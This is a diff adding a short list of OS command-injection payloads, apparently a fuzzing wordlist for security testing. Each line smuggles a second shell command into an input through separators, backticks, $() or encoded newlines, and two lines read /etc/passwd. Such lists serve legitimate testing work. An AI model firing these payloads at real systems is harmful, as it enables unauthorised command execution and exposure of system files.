@@ -1,0 +1,15 @@
+; id
+| id
+& id
+&& id
+|| id
+`id`
+$(id)
+;id;
+
+id
+
+%0aid
+%0d%0aid
+$(cat /etc/passwd)
+; cat /etc/passwd
